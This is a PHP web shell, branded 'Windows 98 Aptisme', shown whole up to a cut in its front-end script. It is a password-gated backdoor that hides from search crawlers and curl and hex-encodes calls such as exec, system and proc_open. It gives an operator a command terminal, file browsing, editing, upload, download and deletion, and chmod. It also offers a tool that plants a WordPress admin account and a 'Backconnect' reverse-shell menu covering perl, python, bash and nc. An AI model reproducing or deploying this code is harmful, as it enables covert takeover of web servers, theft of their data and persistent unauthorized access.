<?php
session_start();
@error_reporting(0);
@set_time_limit(0);

$hashedPassword = "2139cc55c9731274f87ddbda495c2329"; 

if (!empty($_SERVER['HTTP_USER_AGENT'])) {
    $bots = ['Googlebot', 'Slurp', 'MSNBot', 'PycURL', 'facebookexternalhit', 'ia_archiver', 'crawler', 'Yandex', 'Rambler', 'Yahoo! Slurp', 'YahooSeeker', 'bingbot', 'curl'];
    if (preg_match('/' . implode('|', $bots) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell($error = '') {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="robots" content="noindex, nofollow">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Windows 98 Aptisme</title>
        <link rel="icon" type="image/x-icon" href="https://win98icons.alexmeub.com/icons/ico/msie1-2.ico">
        <style>
            body {
                background-color: #008080; 
                font-family: Tahoma, Verdana, sans-serif;
                height: 100vh;
                margin: 0;
                overflow: hidden;
            }
            .desktop-icon {
                position: absolute;
                width: 80px;
                text-align: center;
                font-size: 11px;
                color: white;
            }
            .desktop-icon img {
                width: 32px;
                image-rendering: pixelated;
            }
            .login-box {
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background: rgba(192,192,192,0.9);
                border: 2px solid #000;
                width: 340px;
                box-shadow: inset -2px -2px 0 #808080, inset 2px 2px 0 #ffffff;
                z-index: 1000;
            }
            .login-titlebar {
                background: linear-gradient(#000080, #000060);
                color: #fff;
                padding: 8px;
                font-weight: bold;
                font-size: 13px;
                border-bottom: 1px solid #808080;
                box-shadow: inset 0 -1px 0 #ffffff;
            }
            .login-titlebar img {
                width: 16px;
                vertical-align: middle;
                margin-right: 6px;
            }
            .login-body {
                padding: 20px;
                background: #d4d0c8;
            }
            .login-body label {
                display: block;
                margin-bottom: 8px;
                font-size: 11px;
                color: #000;
            }
            .login-body input[type=password] {
                width: 100%;
                padding: 7px;
                margin-bottom: 15px;
                border: 2px solid #000;
                font-size: 12px;
                background-color: #fff;
                color: #000;
                box-shadow: inset -1px -1px 0 #808080, inset 1px 1px 0 #ffffff;
            }
            .login-body input[type=submit] {
                width: 100%;
                background-color: #c0c0c0;
                color: #000;
                border: 2px solid #000;
                padding: 7px;
                font-weight: bold;
                font-size: 12px;
                cursor: pointer;
                box-shadow: inset -1px -1px 0 #808080, inset 1px 1px 0 #ffffff;
            }
            .login-body input[type=submit]:hover {
                background-color: #a0a0a0;
            }
            .feeling-window {
                position: absolute;
                width: 160px;
                background: #c0c0c0;
                border: 2px solid #000;
                box-shadow: inset -2px -2px 0 #808080, inset 2px 2px 0 #ffffff;
                z-index: 999;
                font-size: 11px;
            }
            .feeling-titlebar {
                background: linear-gradient(#000080, #000060);
                color: #fff;
                padding: 4px;
                font-weight: bold;
                font-size: 11px;
            }
            .feeling-body {
                padding: 10px;
                background: #d4d0c8;
                color: #000;
            }
            .error-message {
                background: #ff0000;
                color: #fff;
                padding: 5px;
                margin-bottom: 10px;
                text-align: center;
                font-size: 11px;
                border: 2px solid #000;
                box-shadow: inset -1px -1px 0 #808080, inset 1px 1px 0 #ffffff;
            }
            @keyframes blink {
                0%, 100% { opacity: 1; }
                50% { opacity: 0; }
            }
        </style>
    </head>
    <body>

        <div class="desktop-icon" style="top: 20px; left: 20px;">
            <img src="https://art.pixilart.com/242f7cb73b49934.png" alt="My Documents">
            <div>My Documents</div>
        </div>
        <div class="desktop-icon" style="top: 100px; left: 20px;">
            <img src="https://win98icons.alexmeub.com/icons/png/computer_explorer-2.png" alt="My Computer">
            <div>My Computer</div>
        </div>
        <div class="desktop-icon" style="top: 180px; left: 20px;">
            <img src="https://win98icons.alexmeub.com/icons/png/recycle_bin_empty-4.png" alt="Recycle Bin">
            <div>Recycle Bin</div>
        </div>
        <div class="desktop-icon" style="top: 260px; left: 20px;">
            <img src="https://win98icons.alexmeub.com/icons/png/msie1-2.png" alt="Internet Explorer">
            <div>Internet Explorer</div>
        </div>
        <div class="desktop-icon" style="top: 340px; left: 20px;">
            <img src="https://win98icons.alexmeub.com/icons/png/network_cool_two_pcs-4.png" alt="Network">
            <div>Network</div>
        </div>

        <div class="login-box">
            <div class="login-titlebar">
                <img src="https://win98icons.alexmeub.com/icons/png/msie1-2.png" alt="Icon">
                [ Login Dulu Deck ]
            </div>
            <div class="login-body">
                <?php if (!empty($error)): ?>
                    <div class="error-message">
                        <strong>Error!</strong> <?= htmlspecialchars($error) ?>
                    </div>
                <?php endif; ?>
                <form method="POST">
                    <label>Password:</label>
                    <input type="password" name="password" required autofocus>
                    <input type="submit" name="login" value="Login">
                </form>
            </div>
        </div>

        <script>
            function spawnFeelingWindow() {
                const w = document.createElement('div');
                w.className = 'feeling-window';
                w.style.top = Math.random() * (window.innerHeight - 100) + 'px';
                w.style.left = Math.random() * (window.innerWidth - 160) + 'px';
                w.innerHTML = '<div class="feeling-titlebar">Feeling</div><div class="feeling-body">Are you OK?</div>';
                document.body.appendChild(w);
                setTimeout(() => { w.remove(); }, 5000);
            }
            setInterval(spawnFeelingWindow, 1000);
            
            // Auto-focus on password field
            document.addEventListener('DOMContentLoaded', function() {
                document.querySelector('input[name="password"]').focus();
            });
        </script>

        <audio autoplay hidden>
            <source src="https://ia800200.us.archive.org/29/items/Windows98StartupSound/Windows%2098%20Startup%20Sound.mp3" type="audio/mpeg">
        </audio>

    </body>
    </html>
    <?php
    exit;
}

$sessionKey = md5($_SERVER['HTTP_HOST']);

if (!isset($_SESSION[$sessionKey])) {
    if (isset($_POST['password'])) {
        if (md5($_POST['password']) === $hashedPassword) {
            $_SESSION[$sessionKey] = true;
        } else {
            login_shell("Invalid password!");
        }
    } else {
        login_shell();
    }
}
?>

<?php
@set_time_limit(90);
@clearstatcache();

$locked = "off";

$Array = [
    '676574637764',
    '676c6f62',
    '69735f646972',
    '69735f66696c65',
    '69735f7772697461626c65',
    '69735f7265616461626c65',
    '66696c657065726d73',
    '66696c65',
    '7068705f756e616d65',
    '6765745f63757272656e745f75736572',
    '68746d6c7370656369616c6368617273',
    '66696c655f6765745f636f6e74656e7473',
    '6d6b646972',
    '746f756368',
    '6368646972',
    '72656e616d65',
    '65786563',
    '7061737374687275',
    '73797374656d',
    '7368656c6c5f65786563',
    '706f70656e',
    '70636c6f7365',
    '73747265616d5f6765745f636f6e74656e7473',
    '70726f635f6f70656e',
    '756e6c696e6b',
    '726d646972',
    '666f70656e',
    '66636c6f7365',
    '66696c655f7075745f636f6e74656e7473',
    '6d6f76655f75706c6f616465645f66696c65',
    '63686d6f64',
    '7379735f6765745f74656d705f646972',
    '6261736536345F6465636F6465',
    '6261736536345F656E636F6465',
];

$hitung_array = count($Array);
for ($i = 0; $i < $hitung_array; $i++) {
    $fungsi[] = unx($Array[$i]);
}

if (isset($_GET['d'])) {
    $cdir = unx($_GET['d']);
    $fungsi[14]($cdir);
} else {
    $cdir = $fungsi[0]();
}

function file_ext($file) {
    $color = '#4da6ff';
    $mime = @mime_content_type($file);
    if ($mime == 'image/png' || $mime == 'image/jpeg') {
        return '<i class="fa-regular fa-image" style="color:' . $color . '"></i>';
    } elseif ($mime == 'application/x-httpd-php' || $mime == 'text/html') {
        return '<i class="fa-solid fa-file-code" style="color:' . $color . '"></i>';
    } elseif ($mime == 'text/javascript') {
        return '<i class="fa-brands fa-square-js" style="color:' . $color . '"></i>';
    } elseif ($mime == 'application/zip' || $mime == 'application/x-7z-compressed') {
        return '<i class="fa-solid fa-file-zipper" style="color:' . $color . '"></i>';
    } elseif ($mime == 'text/plain') {
        return '<i class="fa-solid fa-file" style="color:' . $color . '"></i>';
    } elseif ($mime == 'application/pdf') {
        return '<i class="fa-regular fa-file-pdf" style="color:' . $color . '"></i>';
    } else {
        return '<i class="fa-regular fa-file-code" style="color:' . $color . '"></i>';
    }
}

function download($file) {
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        ob_clean();
        flush();
        readfile($file);
        exit;
    }
}

if (isset($_GET['don']) && $_GET['don'] == true) {
    download(unx($_GET['don']));
}

$title = "Windows 98 Aptisme";

function is_a_bot() {
    $is_bot = false;
    $user_agents = [
        '0af18a012e3e7c6d6a205fd9f39893b4',
        'aaf18a012e3e7c6d6a205fdef39893b4',
        '0af18a012e3e7c6d6a205fdef39893b5',
        '0af18a012e3e7c6d6a205fdef39893b4',
        '0af18a012e3e4c6d6a205fdef39893b4',
        '0af18a012e3e7c6d3a205fdef39893b4',
        '0af18a012e3e7c6d88205fdef39893b4'
    ];
    $user_agent = md5($_SERVER['HTTP_USER_AGENT']);
    foreach ($user_agents as $agent) {
        if ($user_agent === $agent) {
            $is_bot = true;
            break;
        }
    }
    return $is_bot;
}

if ($locked === "on") {
    if (!is_a_bot()) {
        http_response_code(404);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <title><?php echo $title; ?></title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/xml-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/html-hint.min.js"></script>
    <style>
        :root {
            --bg: #1a1a1a;
            --bg2: #222222;
            --bg3: #2a2a2a;
            --text: #d4d4d4;
            --text-light: #ffffff;
            --accent: #4da6ff;
            --accent-hover: #3399ff;
            --danger: #e06c6c;
            --warning: #e0c070;
            --border: #404040;
            --hover-row: #2a2d2e;
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: var(--bg);
            color: var(--text);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            padding: 20px;
            font-size: 14px;
            line-height: 1.5;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            text-rendering: optimizeLegibility;
        }
        a {
            color: var(--accent);
            text-decoration: none;
        }
        a:hover {
            color: var(--accent-hover);
        }
        ul {
            list-style: none;
        }
        .menu-header {
            margin-bottom: 15px;
        }
        .menu-header ul {
            display: flex;
            align-items: center;
        }
        .menu-header li {
            font-weight: 600;
            font-size: 16px;
            color: var(--text-light);
        }
        .menu-tools {
            margin-bottom: 20px;
        }
        .menu-tools ul {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 10px;
        }
        .btn, .form-file {
            background: var(--bg3);
            color: var(--text-light);
            padding: 8px 16px;
            border: 1px solid var(--border);
            border-radius: 4px;
            font-weight: 500;
            cursor: pointer;
            font-size: 13px;
            transition: all 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 5px;
            font-family: inherit;
            -webkit-font-smoothing: antialiased;
        }
        .btn:hover, .form-file:hover {
            background: #333333;
            border-color: #555;
        }
        .btn-accent {
            background: var(--accent);
            color: #fff;
            border-color: var(--accent);
            font-weight: 600;
        }
        .btn-accent:hover {
            background: var(--accent-hover);
            border-color: var(--accent-hover);
            color: #fff;
        }
        .form-upload {
            margin-left: auto;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .menu-file-manager {
            margin-top: 10px;
        }
        .menu-file-manager > ul {
            display: flex;
            gap: 25px;
            margin-bottom: 12px;
        }
        .menu-file-manager > ul a {
            font-weight: 500;
            color: var(--accent);
            border-bottom: 2px solid transparent;
            padding-bottom: 2px;
            transition: all 0.2s;
        }
        .menu-file-manager > ul a:hover {
            border-bottom-color: var(--accent);
            text-decoration: none;
        }
        .path-pwd {
            background: var(--bg2);
            padding: 10px 15px;
            border-radius: 5px;
            margin: 10px 0 15px;
            word-break: break-all;
            font-family: 'Courier New', Courier, monospace;
            font-size: 13px;
            border: 1px solid var(--border);
            color: var(--text);
            font-weight: 500;
        }
        .path-pwd a {
            color: var(--accent);
        }
        .path-pwd a:hover {
            color: var(--accent-hover);
        }
        table {
            width: 100%;
            border-collapse: collapse;
            background: var(--bg2);
            border-radius: 6px;
            overflow: hidden;
            margin-bottom: 15px;
            border: 1px solid var(--border);
            table-layout: auto;
        }
        thead {
            background: var(--bg3);
        }
        th {
            padding: 10px 12px;
            text-align: left;
            font-weight: 600;
            color: var(--text-light);
            font-size: 13px;
            border-bottom: 1px solid var(--border);
            white-space: nowrap;
        }
        th:nth-child(2), th:nth-child(3), th:nth-child(4), th:nth-child(5) {
            text-align: center;
        }
        th:nth-child(2) {
            width: 90px;
        }
        th:nth-child(3) {
            width: 170px;
        }
        th:nth-child(4) {
            width: 140px;
        }
        th:nth-child(5) {
            width: 120px;
        }
        td {
            padding: 8px 12px;
            border-bottom: 1px solid var(--border);
            font-family: 'Courier New', Courier, monospace;
            font-size: 13px;
            color: var(--text);
            word-break: break-all;
            vertical-align: middle;
        }
        td:nth-child(2), td:nth-child(3), td:nth-child(4), td:nth-child(5) {
            text-align: center;
            white-space: nowrap;
        }
        td:first-child {
            word-break: break-all;
        }
        tbody tr:hover {
            background: var(--hover-row);
        }
        tbody tr:nth-child(even) {
            background: #1f1f1f;
        }
        .file-size {
            color: var(--accent);
            font-weight: 600;
        }
        .aptisme-files {
            color: var(--text-light);
            font-weight: 500;
        }
        .aptisme-files:hover {
            color: var(--accent);
        }
        .perm-writable {
            color: #66bb6a;
            font-weight: 600;
        }
        .perm-not-writable {
            color: var(--danger);
            font-weight: 600;
        }
        .perm-unreadable {
            color: var(--warning);
            font-weight: 600;
        }
        .owner-group {
            color: #aaa;
            font-weight: 500;
        }
        .action-icon {
            color: #ccc;
            margin: 0 5px;
            transition: all 0.2s;
            cursor: pointer;
            font-size: 14px;
        }
        .action-icon:hover {
            color: var(--accent);
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.75);
            z-index: 999;
            justify-content: center;
            align-items: center;
        }
        .modal.active {
            display: flex;
        }
        .modal-container {
            background: var(--bg2);
            border-radius: 10px;
            padding: 25px;
            width: 90%;
            max-width: 700px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
            border: 1px solid var(--border);
        }
        .modal-header {
            color: var(--text-light);
            margin-bottom: 20px;
            font-size: 18px;
            font-weight: 600;
        }
        .modal-create-input {
            width: 100%;
            padding: 10px;
            background: var(--bg);
            border: 1px solid var(--border);
            color: var(--text-light);
            font-family: 'Courier New', Courier, monospace;
            margin: 8px 0;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
        }
        .modal-create-input:focus {
            border-color: var(--accent);
            outline: none;
        }
        .modal-btn-form {
            text-align: right;
            margin-top: 20px;
            display: flex;
            justify-content: flex-end;
            gap: 10px;
        }
        .code-editor, .terminal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.85);
            z-index: 999;
            justify-content: center;
            align-items: center;
        }
        .code-editor.active, .terminal.active {
            display: flex;
        }
        .code-editor-container, .terminal-container {
            width: 95%;
            max-width: 1200px;
            background: var(--bg2);
            border-radius: 10px;
            overflow: hidden;
            border: 1px solid var(--border);
        }
        .code-editor-head, .terminal-head {
            background: var(--bg3);
            padding: 12px 15px;
            color: var(--text-light);
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-weight: 600;
        }
        .CodeMirror {
            height: 70vh;
            font-size: 14px;
        }
        .terminal-body textarea {
            width: 100%;
            height: 300px;
            background: var(--bg);
            color: var(--text);
            border: none;
            padding: 10px;
            font-family: 'Courier New', Courier, monospace;
            resize: vertical;
            font-size: 13px;
            font-weight: 500;
        }
        .terminal-body form ul {
            display: flex;
            padding: 10px;
            gap: 10px;
            align-items: center;
        }
        .terminal-input {
            flex: 1;
            padding: 10px;
            background: var(--bg);
            border: 1px solid var(--border);
            color: var(--text);
            font-family: 'Courier New', Courier, monospace;
            border-radius: 4px;
            font-weight: 500;
        }
        ::-webkit-scrollbar {
            width: 10px;
        }
        ::-webkit-scrollbar-track {
            background: var(--bg);
        }
        ::-webkit-scrollbar-thumb {
            background: var(--border);
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #555;
        }
        select.btn {
            appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='%23ffffff' viewBox='0 0 16 16'%3E%3Cpath d='M8 11l-6-6h12z'/%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 10px center;
            padding-right: 30px;
        }
        .select-all-box {
            cursor: pointer;
        }
        .footer-text {
            float: right;
            color: #888;
            margin-top: 10px;
            font-style: italic;
            font-size: 12px;
            font-weight: 500;
        }
        .clear-both {
            clear: both;
        }
        input[type="checkbox"] {
            accent-color: var(--accent);
        }
    </style>
</head>
<body>
    <div class="menu-header">
        <ul>
            <li><i class="fa-solid fa-computer"></i>&nbsp;<?= $fungsi[8](); ?></li>
        </ul>
    </div>
    <div class="menu-tools">
        <ul>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=normal" class="btn"><i class="fa-solid fa-terminal"></i> *SH</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&lockshell" class="btn"><i class="fa-brands fa-linux"></i> Lock This PHP</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&unlockshell" class="btn"><i class="fa-solid fa-unlock-keyhole"></i> Kill All PHP</a></li>
            <li><a href="#" id="lock-file" class="btn"><i class="fa-solid fa-lock"></i> Lock a File</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&backconnect" class="btn"><i class="fa-solid fa-user-secret"></i> Backconnect</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&createwp" class="btn"><i class="fa-brands fa-wordpress-simple"></i> Add User</a></li>
            <li class="form-upload">
                <form action="" method="post" enctype="multipart/form-data">
                    <input type="file" name="aptisme-upload" class="form-file">
                    <input type="submit" value="Upload" name="aptisme-up-submit" class="btn btn-accent">
                </form>
            </li>
        </ul>
    </div>

    <?php
    $file_manager = $fungsi[1]("{.[!.],}*", GLOB_BRACE);
    $get_cewe = $fungsi[0]();
    ?>

    <div class="menu-file-manager">
        <ul>
            <li><a href="#" id="create_folder">+ Create Folder</a></li>
            <li><a href="#" id="create_file">+ Create File</a></li>
        </ul>
        <div class="path-pwd">
            PWD: <?php
            $cwd = str_replace("\\", "/", $get_cewe);
            $pwd = explode("/", $cwd);
            if (stristr(PHP_OS, "WIN")) windowsDriver();
            foreach ($pwd as $id => $val) {
                if ($val == '' && $id == 0) {
                    echo '<a href="?d=' . hx('/') . '">/</a>';
                    continue;
                }
                if ($val == '') continue;
                echo '<a href="?d=';
                for ($i = 0; $i <= $id; $i++) {
                    echo hx($pwd[$i]);
                    if ($i != $id) echo hx("/");
                }
                echo '">' . $val . '</a>/';
            }
            ?>
            <a href="?d=<?= hx(__DIR__) ?>" style="font-weight:bold; color:var(--accent);">[ HOME SHELL ]</a>
        </div>
        <form action="" method="post">
            <table>
                <thead>
                    <tr>
                        <th>
                            <label style="cursor:pointer;user-select:none">
                                <input type="checkbox" id="selectAll" class="select-all-box"> Name
                            </label>
                        </th>
                        <th>Size</th>
                        <th>Perm</th>
                        <th>Owner/Group</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($file_manager as $_D): ?>
                        <?php if ($fungsi[2]($_D)): ?>
                            <?php
                            $fullPath = $fungsi[0]() . '/' . $_D;
                            $permString = perms($fullPath);
                            $numericPerm = substr(sprintf("%o", fileperms($fullPath)), -4);
                            $isWritable = $fungsi[4]($fullPath);
                            $isReadable = $fungsi[5]($fullPath);
                            $permClass = $isWritable ? 'perm-writable' : ($isReadable ? 'perm-not-writable' : 'perm-unreadable');
                            $owner = fileowner($fullPath);
                            $group = filegroup($fullPath);
                            if (function_exists('posix_getpwuid')) {
                                $pw = posix_getpwuid($owner);
                                $owner = $pw ? $pw['name'] : $owner;
                            }
                            if (function_exists('posix_getgrgid')) {
                                $gr = posix_getgrgid($group);
                                $group = $gr ? $gr['name'] : $group;
                            }
                            $ownerGroup = $owner . '/' . $group;
                            ?>
                            <tr>
                                <td>
                                    <input type="checkbox" name="check[]" value="<?= $_D ?>" class="file-check">
                                    <i class="fa-solid fa-folder-open" style="color:var(--accent);margin-right:5px"></i>
                                    <a href="?d=<?= hx($fullPath) ?>" class="aptisme-files"><?= $_D ?></a>
                                </td>
                                <td>[ DIR ]</td>
                                <td><span class="<?= $permClass ?>"><?= $permString ?> (<?= $numericPerm ?>)</span></td>
                                <td class="owner-group"><?= $ownerGroup ?></td>
                                <td>
                                    <a href="?d=<?= hx($fungsi[0]()) ?>&re=<?= hx($_D) ?>" class="action-icon" title="Rename"><i class="fa-solid fa-pen-to-square"></i></a>
                                    <a href="?d=<?= hx($fungsi[0]()) ?>&ch=<?= hx($_D) ?>" class="action-icon" title="Chmod"><i class="fa-solid fa-user-pen"></i></a>
                                </td>
                            </tr>
                        <?php endif; ?>
                    <?php endforeach; ?>

                    <?php foreach ($file_manager as $_F): ?>
                        <?php if ($fungsi[3]($_F)): ?>
                            <?php
                            $fullPath = $fungsi[0]() . '/' . $_F;
                            $permString = perms($fullPath);
                            $numericPerm = substr(sprintf("%o", fileperms($fullPath)), -4);
                            $isWritable = is_writable($fullPath);
                            $isReadable = is_readable($fullPath);
                            $permClass = $isWritable ? 'perm-writable' : ($isReadable ? 'perm-not-writable' : 'perm-unreadable');
                            $owner = fileowner($fullPath);
                            $group = filegroup($fullPath);
                            if (function_exists('posix_getpwuid')) {
                                $pw = posix_getpwuid($owner);
                                $owner = $pw ? $pw['name'] : $owner;
                            }
                            if (function_exists('posix_getgrgid')) {
                                $gr = posix_getgrgid($group);
                                $group = $gr ? $gr['name'] : $group;
                            }
                            $ownerGroup = $owner . '/' . $group;
                            ?>
                            <tr>
                                <td>
                                    <input type="checkbox" name="check[]" value="<?= $_F ?>" class="file-check">
                                    <?= file_ext($_F) ?>
                                    <a href="?d=<?= hx($fungsi[0]()) ?>&f=<?= hx($_F) ?>" class="aptisme-files"><?= $_F ?></a>
                                </td>
                                <td><?= formatSize(filesize($_F)) ?></td>
                                <td><span class="<?= $permClass ?>"><?= $permString ?> (<?= $numericPerm ?>)</span></td>
                                <td class="owner-group"><?= $ownerGroup ?></td>
                                <td>
                                    <a href="?d=<?= hx($fungsi[0]()) ?>&re=<?= hx($_F) ?>" class="action-icon" title="Rename"><i class="fa-solid fa-pen-to-square"></i></a>
                                    <a href="?d=<?= hx($fungsi[0]()) ?>&ch=<?= hx($_F) ?>" class="action-icon" title="Chmod"><i class="fa-solid fa-user-pen"></i></a>
                                    <a href="?d=<?= hx($fungsi[0]()) ?>&don=<?= hx($_F) ?>" class="action-icon" title="Download"><i class="fa-solid fa-download"></i></a>
                                </td>
                            </tr>
                        <?php endif; ?>
                    <?php endforeach; ?>
                </tbody>
            </table>
            <div style="display:flex;gap:12px;align-items:center;margin-top:15px">
                <select name="aptisme-select" class="btn">
                    <option value="delete">Delete</option>
                    <option value="unzip">Unzip</option>
                    <option value="zip">Zip</option>
                </select>
                <input type="submit" name="submit-action" value="Submit" class="btn btn-accent">
            </div>
        </form>
        <div class="footer-text"><?php echo $title; ?></div>
        <div class="clear-both"></div>
    </div>

    <div class="modal" id="generalModal">
        <div class="modal-container">
            <div class="modal-header" id="modal-title"></div>
            <form action="" method="post">
                <div class="modal-body">
                    <div id="modal-input"></div>
                    <div class="modal-btn-form">
                        <input type="submit" name="submit" value="Submit" class="btn btn-accent">
                        <button type="button" class="btn" id="close-modal">Close</button>
                    </div>
                </div>
            </form>
        </div>
    </div>

    <?php if (isset($_GET['createwp'])): ?>
    <div class="modal active">
        <div class="modal-container">
            <div class="modal-header">CREATE WORDPRESS ADMIN PASSWORD</div>
            <form action="" method="post">
                <input type="text" name="db_name" class="modal-create-input" placeholder="DB_NAME"><br>
                <input type="text" name="db_user" class="modal-create-input" placeholder="DB_USER"><br>
                <input type="text" name="db_password" class="modal-create-input" placeholder="DB_PASSWORD"><br>
                <input type="text" name="db_host" class="modal-create-input" placeholder="DB_HOST" value="127.0.0.1"><br>
                <hr style="border-color:var(--border);margin:15px 0"><br>
                <input type="text" name="wp_user" class="modal-create-input" placeholder="Your Username"><br>
                <input type="text" name="wp_pass" class="modal-create-input" placeholder="Your Password"><br>
                <div class="modal-btn-form">
                    <input type="submit" name="submitwp" value="Submit" class="btn btn-accent">
                    <a href="?d=<?= hx($fungsi[0]()) ?>" class="btn">Close</a>
                </div>
            </form>
        </div>
    </div>
    <?php endif; ?>

    <?php if (isset($_GET['backconnect'])): ?>
    <div class="modal active">
        <div class="modal-container">
            <div class="modal-header">Backconnect</div>
            <form action="" method="post">
                <select name="aptisme-bc" class="modal-create-input">
                    <option value="-">Choose Backconnect</option>
                    <option value="perl">Perl</option>
                    <option value="python">Python</option>
                    <option value="ruby">Ruby</option>
                    <option value="bash">Bash</option>
                    <option value="php">php</option>
                    <option value="nc">nc</option>
                    <option value="sh">sh</option>
                    <option value="xterm">Xterm</option>
                    <option value="golang">Golang</option>
                </select>
                <input type="text" name="backconnect-host" class="modal-create-input" placeholder="127.0.0.1"><br>
                <input type="number" name="backconnect-port" class="modal-create-input" placeholder="1337">
                <div class="modal-btn-form">
                    <input type="submit" name="submit-bc" value="Submit" class="btn btn-accent">
                    <a href="?d=<?= hx($fungsi[0]()) ?>" class="btn">Close</a>
                </div>
            </form>
        </div>
    </div>
    <?php endif; ?>

    <?php if (isset($_GET['f'])): ?>
    <div class="code-editor active">
        <div class="code-editor-container">
            <div class="code-editor-head">
                <span><i class="fa-solid fa-code"></i> Code Editor : <?= unx($_GET['f']) ?></span>
                <button class="btn" id="close-editor">Close</button>
            </div>
            <div class="code-editor-body">
                <form action="" method="post">
                    <textarea name="code-editor" id="code"><?= $fungsi[10]($fungsi[11]($fungsi[0]() . "/" . unx($_GET['f']))) ?></textarea>
                    <div style="text-align:right;padding:10px">
                        <input type="submit" name="save-editor" value="Save" class="btn btn-accent">
                    </div>
                </form>
            </div>
        </div>
    </div>
    <?php endif; ?>

    <?php if (isset($_GET['terminal']) && $_GET['terminal'] == "normal"): ?>
    <div class="terminal active">
        <div class="terminal-container">
            <div class="terminal-head">
                <span><i class="fa-solid fa-terminal"></i> TERMINAL</span>
                <button class="btn close-terminal">Close</button>
            </div>
            <div class="terminal-body">
                <textarea readonly><?php
                    if (isset($_POST['terminal'])) {
                        echo $fungsi[10](cmd($_POST['terminal-text'] . " 2>&1"));
                    }
                ?></textarea>
                <form action="" method="post">
                    <ul>
                        <li><input type="text" name="terminal-text" class="terminal-input" placeholder="<?= $fungsi[9]() . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"] ?>" autofocus></li>
                        <li><input type="submit" name="terminal" value=">" class="btn btn-accent"></li>
                    </ul>
                </form>
            </div>
        </div>
    </div>
    <?php endif; ?>

    <?php if (isset($_GET['re'])): ?>
    <div class="modal active">
        <div class="modal-container">
            <div class="modal-header">Rename : <?= unx($_GET['re']) ?></div>
            <form action="" method="post">
                <input type="text" name="renameFile" class="modal-create-input" placeholder="New name">
                <div class="modal-btn-form">
                    <input type="submit" name="submit" value="Submit" class="btn btn-accent">
                    <button type="button" class="btn close-modal">Close</button>
                </div>
            </form>
        </div>
    </div>
    <?php endif; ?>

    <?php if (isset($_GET['ch'])): ?>
    <div class="modal active">
        <div class="modal-container">
            <div class="modal-header">Change Permission : <?= unx($_GET['ch']) ?></div>
            <form action="" method="post">
                <input type="text" name="chFile" class="modal-create-input" placeholder="0755">
                <div class="modal-btn-form">
                    <input type="submit" name="submit" value="Submit" class="btn btn-accent">
                    <button type="button" class="btn close-modal">Close</button>
                </div>
            </form>
        </div>
    </div>
    <?php endif; ?>

    <script>
        $(document).ready(function(){
            $('#selectAll').change(function(){$('.file-check').prop('checked',this.checked)});
            $(document).on('change','.file-check',function(){
                if($('.file-check:checked').length===$('.file-check').length)$('#selectAll').prop('checked',true);
                else $('#selectAll').prop('checked',false)
            });
            $('#create_folder').click(function(e){
                e.preventDefault();
                $('#modal-title').html('<i class="fa-solid fa-folder-plus"></i> Create Folder');
                $('#modal-input').html('<input type="text" name="create_folder" class="modal-create-input" placeholder="Folder name">');
                $('#generalModal').addClass('active')
            });
            $('#create_file').click(function(e){
                e.preventDefault();
